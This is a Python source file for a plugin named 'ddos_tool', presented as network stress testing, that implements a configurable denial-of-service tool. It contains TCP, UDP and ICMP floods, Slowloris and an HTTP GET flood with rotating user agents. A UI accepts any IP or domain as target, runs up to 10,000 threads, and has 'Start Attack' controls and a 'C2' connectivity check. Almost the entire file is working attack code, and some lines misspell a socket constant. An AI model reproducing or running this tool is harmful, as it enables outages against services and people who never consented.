# plugin.py
import socket
import threading
import time
import random
import subprocess
import sys
import ssl
from plugin_sdk import Plugin, Field

# ==================== ATTACK IMPLEMENTATIONS ====================

class AttackMethods:
    
    @staticmethod
    def resolve_target(target):
        """Resolve domain to IP if needed"""
        try:
            socket.inet_aton(target)
            return target  # Already an IP
        except socket.error:
            return socket.gethostbyname(target)  # Resolve domain
    
    @staticmethod
    def tcp_flood(target, port, duration, stop_event):
        target_ip = AttackMethods.resolve_target(target)
        end_time = time.time() + duration
        count = 0
        while time.time() < end_time and not stop_event.is_set():
            try:
                sock = socket.socket(socket.A_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((target_ip, port))
                sock.send(random._urandom(1024))
                count += 1
                sock.close()
            except:
                pass
        return count
    
    @staticmethod
    def udp_flood(target, port, duration, stop_event):
        target_ip = AttackMethods.resolve_target(target)
        end_time = time.time() + duration
        count = 0
        sock = socket.socket(socket.A_INET, socket.SOCK_DGRAM)
        payload = random._urandom(65507)
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                sock.sendto(payload, (target_ip, port))
                count += 1
            except:
                pass
        return count
    
    @staticmethod
    def icmp_flood(target, duration, stop_event):
        target_ip = AttackMethods.resolve_target(target)
        end_time = time.time() + duration
        count = 0
        
        try:
            sock = socket.socket(socket.A_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except PermissionError:
            while time.time() < end_time and not stop_event.is_set():
                try:
                    ping_cmd = ["ping", "-c", "1", "-s", "65507", target_ip]
                    if sys.platform == "win32":
                        ping_cmd = ["ping", "-n", "1", "-l", "65500", target_ip]
                    subprocess.Popen(ping_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    count += 1
                except:
                    pass
            return count
        
        icmp_id = random.randint(0, 65535)
        icmp_seq = 0
        payload = random._urandom(56)
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                header = bytes([8, 0, 0, 0, (icmp_id >> 8) & 0xff, icmp_id & 0xff,
                               (icmp_seq >> 8) & 0xff, icmp_seq & 0xff])
                sock.sendto(header + payload, (target_ip, 0))
                icmp_seq = (icmp_seq + 1) % 65536
                count += 1
            except:
                pass
        return count
    
    @staticmethod
    def slowloris(target, port, duration, use_ssl, stop_event):
        """Slowloris with optional HTTPS support"""
        end_time = time.time() + duration
        sockets = []
        count = 0
        
        # Determine if we should use SSL based on port or explicit flag
        is_ssl = use_ssl or (port == 443)
        
        while time.time() < end_time and not stop_event.is_set():
            for _ in range(50):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(4)
                    
                    # Resolve if domain
                    try:
                        socket.inet_aton(target)
                        conn_target = target
                    except socket.error:
                        conn_target = socket.gethostbyname(target)
                    
                    sock.connect((conn_target, port))
                    
                    # Wrap with SSL if HTTPS
                    if is_ssl:
                        context = ssl.create_default_context()
                        sock = context.wrap_socket(sock, server_hostname=target)
                    
                    # Send partial HTTP request (use domain for Host header if available)
                    host_header = target if not target.replace('.','').isdigit() else conn_target
                    
                    sock.send(f"GET / HTTP/1.1\r\nHost: {host_header}\r\n".encode())
                    sockets.append((sock, time.time()))
                    count += 1
                except Exception as e:
                    pass
            
            # Keepalive existing connections
            for sock, create_time in sockets[:]:
                try:
                    if time.time() - create_time > 10:  # Refresh old connections
                        sock.close()
                        sockets.remove((sock, create_time))
                    else:
                        sock.send(b"X-a: keepalive\r\n")
                except:
                    sockets.remove((sock, create_time))
            
            time.sleep(3)
        
        for sock, _ in sockets:
            try:
                sock.close()
            except:
                pass
        return count
    
    @staticmethod
    def http_get_flood(target, port, duration, use_ssl, stop_event):
        """HTTP/HTTPS GET flood"""
        end_time = time.time() + duration
        count = 0
        is_ssl = use_ssl or (port == 443)
        
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
        ]
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                
                # Resolve domain if needed
                try:
                    socket.inet_aton(target)
                    conn_target = target
                except socket.error:
                    conn_target = socket.gethostbyname(target)
                
                sock.connect((conn_target, port))
                
                # Wrap with SSL for HTTPS
                if is_ssl:
                    context = ssl.create_default_context()
                    sock = context.wrap_socket(sock, server_hostname=target)
                
                host_header = target if not target.replace('.','').isdigit() else conn_target
                ua = random.choice(user_agents)
                
                request = (
                    f"GET /?{random.randint(0,99999)} HTTP/1.1\r\n"
                    f"Host: {host_header}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    f"Accept-Language: en-US,en;q=0.5\r\n"
                    f"Accept-Encoding: gzip, deflate\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                )
                
                sock.send(request.encode())
                count += 1
                sock.close()
            except Exception as e:
                pass
        return count

# ==================== CONNECTIVITY MONITOR ====================

class ConnectivityMonitor:
    def __init__(self):
        self.connected = True
        self.stop_event = threading.Event()
        self.thread = None
    
    def _check_loop(self):
        while not self.stop_event.is_set():
            try:
                ping_cmd = ["ping", "-c", "1", "-W", "3", "1.1.1.1"]
                if sys.platform == "win32":
                    ping_cmd = ["ping", "-n", "1", "-w", "3000", "1.1.1.1"]
                
                result = subprocess.run(ping_cmd, capture_output=True, timeout=5)
                success = result.returncode == 0
                
                if not success and self.connected:
                    self.connected = False
                elif success and not self.connected:
                    self.connected = True
            except:
                self.connected = False
            
            time.sleep(3)
    
    def start(self):
        self.thread = threading.Thread(target=self._check_loop, daemon=True)
        self.thread.start()
    
    def stop(self):
        self.stop_event.set()
        if self.thread:
            self.thread.join(timeout=1)

# ==================== PLUGIN SETUP ====================

ui = [
    Field.section("Target Configuration"),
    Field.text("target", label="Target (IP or Domain)", default="1.1.1.1", placeholder="e.g., 192.168.1.1 or example.com"),
    Field.number("port", label="Port", default=80, min_val=1, max_val=65535),
    Field.toggle("use_ssl", label="Use SSL/HTTPS", default=False),
    
    Field.section("Attack Settings"),
    Field.select("attack_type", label="Attack Type", options=[
        {"label": "TCP Flood", "value": "tcp_flood"},
        {"label": "UDP Flood", "value": "udp_flood"},
        {"label": "ICMP Flood", "value": "icmp_flood"},
        {"label": "Slowloris", "value": "slowloris"},
        {"label": "HTTP GET Flood", "value": "http_get"},
        {"label": "All Methods", "value": "all"}
    ], default="tcp_flood"),
    Field.number("threads", label="Threads", default=100, min_val=1, max_val=10000),
    Field.number("duration", label="Duration (seconds)", default=60, min_val=1, max_val=3600),
    
    Field.section("Safety"),
    Field.toggle("enable_c2_check", label="Enable C2 Connectivity Check", default=True),
    
    Field.section("Control"),
    Field.button("start_attack", label="▶ Start Attack"),
    Field.button("stop_attack", label="⏹ Stop Attack"),
    
    Field.section("Status"),
    Field.output("status", label="Attack Status", height="100px"),
    Field.output("stats", label="Statistics", height="150px"),
    Field.output("log", label="Event Log", height="200px"),
]

plugin = Plugin("ddos_tool", "1.1", "Network stress testing with HTTPS/domain support", ui, author="erratic")

attack_state = {
    "running": False,
    "stop_event": threading.Event(),
    "threads": [],
    "monitor": None,
    "stats": {"packets_sent": 0, "start_time": None, "method": ""}
}

# ==================== COMMAND HANDLERS ====================

@plugin.on_command("start_attack")
def start_attack(args):
    global attack_state
    
    if attack_state["running"]:
        plugin.set_output("log", "[!] Attack already running")
        return {"status": "already_running"}
    
    target = plugin.get_field("target")
    port = plugin.get_field("port")
    attack_type = plugin.get_field("attack_type")
    thread_count = plugin.get_field("threads")
    duration = plugin.get_field("duration")
    enable_c2 = plugin.get_field("enable_c2_check")
    use_ssl = plugin.get_field("use_ssl")
    
    # Validate target (IP or domain)
    try:
        socket.inet_aton(target)
        target_type = "IP"
    except socket.error:
        try:
            socket.gethostbyname(target)
            target_type = "Domain"
        except socket.gaierror:
            plugin.set_output("log", f"[!] Invalid target: {target}")
            return {"status": "invalid_target"}
    
    attack_state["running"] = True
    attack_state["stop_event"].clear()
    attack_state["threads"] = []
    attack_state["stats"] = {"packets_sent": 0, "start_time": time.time(), "method": attack_type}
    
    if enable_c2:
        attack_state["monitor"] = ConnectivityMonitor()
        attack_state["monitor"].start()
        plugin.set_output("log", "[*] C2 connectivity monitor started")
    
    proto = "HTTPS" if use_ssl or port == 443 else "HTTP"
    plugin.set_output("status", f"ATTACKING {target}:{port} ({target_type}/{proto}) via {attack_type}")
    plugin.log(f"Starting {attack_type} on {target}:{port} (SSL={use_ssl})")
    
    def attack_worker(method_func, *method_args):
        while not attack_state["stop_event"].is_set():
            if enable_c2 and attack_state["monitor"] and not attack_state["monitor"].connected:
                plugin.set_output("log", "[!] C2 connectivity LOST - stopping attack")
                plugin.set_output("status", "STOPPED - C2 lost")
                attack_state["stop_event"].set()
                break
            
            try:
                result = method_func(*method_args, attack_state["stop_event"])
                if result:
                    attack_state["stats"]["packets_sent"] += result
            except Exception as e:
                plugin.log(f"Thread error: {e}")
    
    method_map = {
        "tcp_flood": (AttackMethods.tcp_flood, (target, port, duration)),
        "udp_flood": (AttackMethods.udp_flood, (target, port, duration)),
        "icmp_flood": (AttackMethods.icmp_flood, (target, duration)),
        "slowloris": (AttackMethods.slowloris, (target, port, duration, use_ssl)),
        "http_get": (AttackMethods.http_get_flood, (target, port, duration, use_ssl)),
    }
    
    for i in range(thread_count):
        if attack_type == "all":
            methods = list(method_map.keys())
            method_name = methods[i % len(methods)]
        else:
            method_name = attack_type
        
        if method_name in method_map:
            method_func, method_args = method_map[method_name]
            t = threading.Thread(target=attack_worker, args=(method_func, *method_args), daemon=True)
            t.start()
            attack_state["threads"].append(t)
    
    def stats_reporter():
        while attack_state["running"] and not attack_state["stop_event"].is_set():
            time.sleep(5)
            elapsed = time.time() - attack_state["stats"]["start_time"]
            pps = attack_state["stats"]["packets_sent"] / elapsed if elapsed > 0 else 0
            
            stats_text = (
                f"Target: {target}:{port}\n"
                f"Method: {attack_type}\n"
                f"Duration: {elapsed:.1f}s / {duration}s\n"
                f"Threads: {thread_count}\n"
                f"Packets: {attack_state['stats']['packets_sent']}\n"
                f"Rate: {pps:.1f} pkt/sec\n"
                f"C2: {'UP' if (not enable_c2 or attack_state['monitor'].connected) else 'DOWN'}"
            )
            plugin.set_output("stats", stats_text)
            
            if elapsed >= duration:
                plugin.set_output("log", "[*] Duration reached")
                stop_attack({"auto": True})
                break
    
    stats_thread = threading.Thread(target=stats_reporter, daemon=True)
    stats_thread.start()
    attack_state["threads"].append(stats_thread)
    
    return {"status": "started"}

@plugin.on_command("stop_attack")
def stop_attack(args):
    global attack_state
    
    if not attack_state["running"]:
        plugin.set_output("log", "[!] No attack running")
        return {"status": "not_running"}
    
    plugin.set_output("status", "STOPPING...")
    plugin.log("Stopping attack...")
    
    attack_state["stop_event"].set()
    attack_state["running"] = False
    
    if attack_state["monitor"]:
        attack_state["monitor"].stop()
    
    for t in attack_state["threads"]:
        t.join(timeout=2)
    
    attack_state["threads"] = []
    
    elapsed = time.time() - attack_state["stats"]["start_time"]
    plugin.set_output("status", "STOPPED")
    plugin.set_output("stats", f"Attack Complete\nTotal: {attack_state['stats']['packets_sent']} packets\nTime: {elapsed:.1f}s")
    plugin.set_output("log", "[*] Attack stopped")
    
    return {"status": "stopped"}

plugin.run()
